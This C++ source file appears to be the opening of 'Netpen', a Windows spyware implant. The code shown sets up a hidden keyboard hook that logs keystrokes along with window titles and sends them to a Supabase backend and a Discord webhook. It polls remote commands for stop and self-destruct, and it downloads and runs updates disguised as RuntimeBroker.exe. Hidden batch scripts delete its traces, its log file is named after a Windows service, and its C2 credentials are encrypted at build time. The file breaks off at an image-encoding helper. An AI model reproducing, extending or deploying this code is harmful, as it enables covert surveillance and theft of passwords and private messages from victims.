// === Netpen agent — single-file C++ implant =====================================
// Architecture: watchdog process (WinMain) spawns a hidden child (--child) that
// installs a low-level keyboard hook and services a 1-second timer.
// The watchdog guarantees the child is always running (restarts on crash) and
// checks Supabase for remote updates / self-destruct every 5 minutes.
// All C2 state lives in Supabase (control table, keystrokes, screenshots, etc.)
// ================================================================================

#include <windows.h>
#define INITGUID
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <cstdint>
#include <ctime>
#include <wincrypt.h>
#include <gdiplus.h>
#include <dshow.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include "config.h"          // build-time generated: version + encrypted C2 URLs/keys
#include <tlhelp32.h>
#include <shlobj.h>          // IShellLinkW for startup-folder .lnk creation
#include "capture_shared.h"  // shared struct for DLL-injection webcam capture

// Missing DirectShow declarations (not available in this mingw version)
static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const CLSID CLSID_NullRenderer = {0xC1F400A4,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
static const IID IID_ISampleGrabber = {0x6B652FFF,0x11FE,0x4fce,{0x92,0xAD,0x02,0x66,0xB5,0xD7,0xC7,0x8F}};
MIDL_INTERFACE("6B652FFF-11FE-4fce-92AD-0266B5D7C78F")
ISampleGrabber : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetSample(IMediaSample**) = 0;
};

#ifndef NETPEN_VERSION
#define NETPEN_VERSION 0
#endif

// Supabase REST + Storage endpoint paths (relative to g_supabaseHost)
#define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
#define SUPABASE_CONTROL_PATH L"/rest/v1/control"
#define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
#define SUPABASE_CONFIG_PATH L"/rest/v1/agent_config"
#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
#define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
#define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"

// --- Runtime state (child process) ---
static HHOOK g_hHook = NULL;                 // WH_KEYBOARD_LL handle
static std::string g_winTitle;               // current foreground-window title
static std::string g_keys;                   // accumulated keystrokes awaiting flush
static DWORD g_lastTick = 0;                 // GetTickCount of last keystroke (idle-flush trigger)
static DWORD g_lastDiscord = 0;              // throttle for Discord webhook posts (30s)
static DWORD g_lastAutoScreenshot = 0;      // throttle for trigger-based screenshots (5 min)
static std::vector<std::string> g_triggers;   // keyword list from Supabase screenshot_triggers
static std::string g_pendingAutoTitle;        // queued window title for auto-SS (processed on timer)
static std::string g_pendingAutoKw;           // matched keyword for the pending auto-SS
static DWORD g_pendingAutoAt = 0;             // GetTickCount when pending auto-SS may capture (settle delay)
static std::string g_pendingFlushWin;         // title for keys queued off the keyboard hook
static std::string g_pendingFlushKeys;        // keys to flush on timer (never network from hook)
static bool g_running = true;                 // false stops the message loop and lets child exit
static bool g_selfDestructing = false;        // latched true while self-destruct is in progress
static std::string g_hostname;                // local computer name, used as agent key everywhere
static std::string g_lastClipboard;           // last clipboard text seen (dedup)
static std::string g_lastPasswordDigest;      // last password-field digest (dedup)
static HWND g_hwnd = NULL;                    // hidden message-only window backing WndProc

// --- Decrypted C2 credentials (populated once in InitConfig) ---
static std::wstring g_supabaseHost;
static std::wstring g_supabaseKey;            // anon key — used for normal REST calls
static std::wstring g_supabaseServiceKey;     // service key — used for Storage PUT uploads
static std::wstring g_discordHost;
static std::wstring g_discordPath;            // Discord webhook path

// Decrypt the C2 config blobs baked into config.h at build time.
static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
    g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
    g_supabaseServiceKey = DecryptW(_enc_SUPABASE_SERVICE_KEY, sizeof(_enc_SUPABASE_SERVICE_KEY));
    g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
    g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
}

// --- String helpers (UTF-8 <-> UTF-16) ---

static std::wstring ToWide(const std::string& s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring buf((size_t)len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &buf[0], len);
    return buf;
}

static std::string ToNarrow(const std::wstring& s) {
    int len = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, NULL, NULL);
    std::string buf((size_t)len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], len, NULL, NULL);
    return buf;
}

// Path/Storage-safe form of g_hostname (PCNAME\user -> PCNAME_user).
// Use for temp files and Storage object keys only — not for JSON identity.
static std::string SafeHostSlug(const std::string& host) {
    std::string out = host.empty() ? "unknown" : host;
    for (size_t i = 0; i < out.size(); i++) {
        char c = out[i];
        if (c == '\\' || c == '/' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
            out[i] = '_';
    }
    return out;
}

// Percent-encode for PostgREST filter values (hostname=eq....).
static std::string UrlEncode(const std::string& s) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    out.reserve(s.size() * 3);
    for (size_t i = 0; i < s.size(); i++) {
        unsigned char c = (unsigned char)s[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            out += (char)c;
        } else {
            out += '%';
            out += hex[c >> 4];
            out += hex[c & 0xF];
        }
    }
    return out;
}

// Wide hostname filter for hostname=eq.<encoded> query segments.
static std::wstring HostFilterEq() {
    return ToWide(UrlEncode(g_hostname));
}

// JSON-escape a string for embedding in a JSON string value.
static std::string EscapeJSON(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    sprintf_s(buf, 8, "\\u%04x", (unsigned char)c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

// Minimal JSON string extractor (no external dep). Looks for "key":"..." and
// unescapes the value. Returns "" if not found.
static std::string ExtractJSONString(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    std::string result;
    while (pos < json.size()) {
        char c = json[pos];
        if (c == '\\') {
            pos++;
            if (pos >= json.size()) break;
            if (json[pos] == '"') result += '"';
            else if (json[pos] == '\\') result += '\\';
            else if (json[pos] == 'n') result += '\n';
            else if (json[pos] == 'r') result += '\r';
            else if (json[pos] == 't') result += '\t';
            else { result += '\\'; result += json[pos]; }
        } else if (c == '"') {
            break;
        } else {
            result += c;
        }
        pos++;
    }
    return result;
}

// Minimal JSON number extractor. Returns the raw token between "key": and the next , } ].
static std::string ExtractJSONNumber(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    size_t end = json.find_first_of(",}]", pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

// ISO-8601 UTC timestamp for Supabase inserts / Discord embeds.
static std::string GetTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", tm);
    return std::string(buf);
}

// Filename of the running executable (e.g. "RuntimeBroker.exe" or "a.exe").
// Used everywhere we need to refer to self on disk or as a registry value name.
static std::string GetExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(pos + 1);
    return full;
}

static std::wstring GetExeNameW() {
    return ToWide(GetExeName());
}

static std::string GetWindowTitle() {
    char buf[512] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) GetWindowTextA(hwnd, buf, sizeof(buf) - 1);
    return std::string(buf);
}

// Basename of the foreground process (e.g. "WhatsApp.exe"). Empty on failure.
static std::string GetForegroundProcessName() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "";
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (!pid) return "";
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return "";
    char path[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    std::string name;
    if (QueryFullProcessImageNameA(h, 0, path, &size) && size > 0) {
        std::string full(path, size);
        size_t pos = full.find_last_of("\\/");
        name = (pos != std::string::npos) ? full.substr(pos + 1) : full;
    }
    CloseHandle(h);
    return name;
}

static bool ForegroundIsWhatsApp() {
    std::string name = GetForegroundProcessName();
    if (name.empty()) return false;
    for (size_t i = 0; i < name.size(); i++)
        name[i] = (char)tolower((unsigned char)name[i]);
    return name == "whatsapp.exe";
}

// Translate a virtual key code into a human-readable string for the keystrokes table.
// Respects Shift/Caps for letters, Shift for digits/punctuation. Returns "" for
// pure modifier keys (so they don't pollute the buffer).
static std::string GetKeyString(DWORD vk) {
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool upper = shift ^ caps;

    if (vk >= 'A' && vk <= 'Z') {
        char c = upper ? (char)vk : (char)(vk + 32);
        return std::string(1, c);
    }

    if (vk >= '0' && vk <= '9') {
        const char* shiftNums = ")!@#$%^&*(";
        char c = shift ? shiftNums[vk - '0'] : (char)vk;
        return std::string(1, c);
    }

    switch (vk) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[Enter]";
        case VK_TAB: return "[Tab]";
        case VK_BACK: return "[Back]";
        case VK_DELETE: return "[Del]";
        case VK_ESCAPE: return "[Esc]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PgUp]";
        case VK_NEXT: return "[PgDn]";
        case VK_INSERT: return "[Ins]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE: return "[Pause]";
        case VK_APPS: return "[Menu]";
        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL: return "";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";
        case VK_LWIN: case VK_RWIN: return "";
        case VK_VOLUME_MUTE: case VK_VOLUME_DOWN: case VK_VOLUME_UP: return "";
        case VK_MEDIA_NEXT_TRACK: case VK_MEDIA_PREV_TRACK: return "";
        case VK_MEDIA_STOP: case VK_MEDIA_PLAY_PAUSE: return "";
        default: break;
    }

    if (vk >= VK_F1 && vk <= VK_F24) {
        char buf[16];
        sprintf_s(buf, 16, "[F%d]", vk - VK_F1 + 1);
        return std::string(buf);
    }

    switch (vk) {
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "~" : "`";
        case VK_OEM_4: return shift ? "{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";
        case VK_OEM_102: return shift ? "|" : "\\";
        case VK_DIVIDE: return "/";
        case VK_MULTIPLY: return "*";
        case VK_SUBTRACT: return "-";
        case VK_ADD: return "+";
        case VK_DECIMAL: return ".";
        default: break;
    }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char c = '0' + (vk - VK_NUMPAD0);
        return std::string(1, c);
    }

    return "";
}

// Append a timestamped line to %TEMP%\wuaueng.log. Used for diagnostics only —
// the log is wiped on self-destruct (CleanupPersistence + ScheduleSelfDestruct).
static void LogMsg(const std::string& msg) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string logPath = std::string(tmp) + "wuaueng.log";
    FILE* f = NULL;
    fopen_s(&f, logPath.c_str(), "a");
    if (f) {
        fprintf(f, "[%s] %s\n", GetTimestamp().c_str(), msg.c_str());
        fclose(f);
    }
}

// Generic Supabase REST request. Uses anon key (g_supabaseKey) for both
// apikey + Authorization headers. 5s timeouts on every phase. Caller is
// responsible for closing nothing — all HINTERNET handles are cleaned up here.
// Returns true only for HTTP 2xx, with the body in `response`.
static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"apikey: ";
    headers += g_supabaseKey;
    headers += L"\r\nAuthorization: Bearer ";
    headers += g_supabaseKey;
    headers += L"\r\nContent-Type: application/json";

    BOOL sent = FALSE;
    if (body.empty()) {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), NULL, 0, 0, 0);
    } else {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    }

    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD status = 0;
    DWORD statusSize = sizeof(status);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            result.append(buf, downloaded);
        }
        delete[] buf;
    }

    response = result;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return status >= 200 && status < 300;
}

// POST a single keystrokes JSON row to Supabase.
static bool PostKeys(const std::string& json) {
    std::string response;
    return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
}

// GET a Supabase path and return the body as a string (no apikey needed for
// public Storage objects, but harmless to send anyway).
static bool HttpGetToString(const wchar_t* path, std::string& response) {
    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    response = result;
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

// Download a Supabase Storage object to a local file. Used by the auto-updater
// to fetch the new RuntimeBroker.exe. 15s timeouts (large binary, may be slow).
static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

// Heuristic filter: if the text uses <= 2 unique characters, it's spam (e.g.
// "aaaaaaaa", "12121212") and should not be sent to Discord.
static bool IsSpamText(const std::string& s) {
    if (s.size() <= 5) return false;
    bool seen[256] = {false};
    int unique = 0;
    for (size_t i = 0; i < s.size(); i++) {
        if (!seen[(unsigned char)s[i]]) {
            seen[(unsigned char)s[i]] = true;
            unique++;
            if (unique >= 3) return false;
        }
    }
    return true;
}

// Post keystroke text to the Discord webhook as an embed. Rate-limited to once
// per 30s via g_lastDiscord. Filtered via IsSpamText. Fire-and-forget — no
// retry on failure.
static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
    if (IsSpamText(keys)) return;
    DWORD now = GetTickCount();
    if (now - g_lastDiscord < 30000) return;
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string win = window.empty() ? "unknown" : window;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";

    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += "\",\"color\":3066993,\"fields\":[{\"name\":\"Window\",\"value\":\"";
    payload += EscapeJSON(win);
    payload += "\",\"inline\":false}],\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// Poll Supabase control table for a pending "stop" command for this hostname.
// Marks it executed if found so it only fires once.
// Requires a real numeric id — error JSON / non-array bodies are ignored.
static bool CheckStop() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
    query += HostFilterEq();
    query += L"&select=id&limit=1";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]" || response[0] != '[') return false;
    std::string rowId = ExtractJSONNumber(response, "id");
    if (rowId.empty()) return false;
    for (size_t i = 0; i < rowId.size(); i++) {
        if (rowId[i] < '0' || rowId[i] > '9') return false;
    }
    std::string patch = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
    return true;
}

// Path of the directory containing the running EXE, with trailing backslash.
static std::string GetExeDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(0, pos + 1);
    return "";
}

// Write an empty ".kill" file next to the EXE. On the next watchdog poll, the
// watchdog sees this file, kills the child, and exits itself.
static void CreateKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    FILE* f = NULL;
    fopen_s(&f, flagPath.c_str(), "w");
    if (f) fclose(f);
}

// Check whether the ".kill" flag exists.
static bool KillFlagExists() {
    FILE* f = NULL;
    std::string flagPath = GetExeDir() + ".kill";
    fopen_s(&f, flagPath.c_str(), "r");
    if (f) { fclose(f); return true; }
    return false;
}

// Delete the ".kill" flag file.
static void RemoveKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    DeleteFileA(flagPath.c_str());
}

// Self-destruct mechanism:
//   1. Mark the EXE for deletion on next boot via MoveFileEx (survives hard reboot mid-cleanup).
//   2. Create %TEMP%\NetpenCleanup.bat — a cmd script that waits for this process to exit,
//      then deletes the EXE, the log file, and itself.
//   3. Launch the batch as a hidden cmd.exe process (CREATE_NO_WINDOW).
// Called from WndProc after CleanupPersistence and CreateKillFlag have run.
static void ScheduleSelfDestruct() {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    std::string exeName = GetExeName();
    std::string logPath = std::string(tmp) + "wuaueng.log";
    std::string batPath = std::string(tmp) + "NetpenCleanup.bat";
    std::string bat =
        std::string("@echo off\r\n")
        + ":w\r\n"
        + "tasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
        + "if errorlevel 1 goto r\r\n"
        + "timeout /t 2 /nobreak >nul\r\n"
        + "goto w\r\n"
        + ":r\r\n"
        + "del /f /q \"" + std::string(selfPath) + "\" >nul 2>&1\r\n"
        + "del /f /q \"" + logPath + "\" >nul 2>&1\r\n"
        + "del /f /q \"" + batPath + "\" >nul 2>&1\r\n";
    HANDLE hf = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
    CloseHandle(hf);
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::string cmd = "cmd.exe /c \"" + batPath + "\"";
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(batPath.c_str());
    } else {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

// Poll Supabase control table for a pending "selfdestruct" command.
// Requires a real numeric id — error JSON / non-array bodies are ignored.
static bool CheckSelfDestruct() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
    query += HostFilterEq();
    query += L"&select=id&limit=1";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]" || response[0] != '[') return false;
    std::string rowId = ExtractJSONNumber(response, "id");
    if (rowId.empty()) return false;
    for (size_t i = 0; i < rowId.size(); i++) {
        if (rowId[i] < '0' || rowId[i] > '9') return false;
    }
    std::string patch = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
    return true;
}

// Read version.txt from Supabase Storage. The watchdog uses this to decide
// when to auto-update.
static int GetRemoteVersion() {
    std::string s;
    if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    if (s.empty()) return -1;
    return atoi(s.c_str());
}

// Auto-update: download the new EXE from Storage, save as NetpenUpdate.exe, then
// create a batch that waits for this process to exit, copies the new EXE over the
// old one, starts it, and cleans up. The watchdog triggers this when
// GetRemoteVersion() > NETPEN_VERSION.
static bool DeployUpdate(int remoteVer) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
    if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
        LogMsg("Update: download failed");
        return false;
    }
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string exeName = GetExeName();
    std::string bat =
        std::string("@echo off\r\n")
        + "set \"O=" + std::string(selfPath) + "\"\r\n"
        + "set \"N=" + newExe + "\"\r\n"
        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
        + "start \"\" \"%O%\"\r\n"
        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
    HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
    DWORD w = 0;
    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
    CloseHandle(hf);
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::string cmd = "cmd.exe /c \"" + batFile + "\"";
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    LogMsg("Update deployed: v" + std::to_string(remoteVer));
    return true;
}

// Find the GDI+ encoder CLSID for a given MIME type (e.g. "image/jpeg").
// Required to save Gdiplus::Bitmap to JPEG with configurable quality.
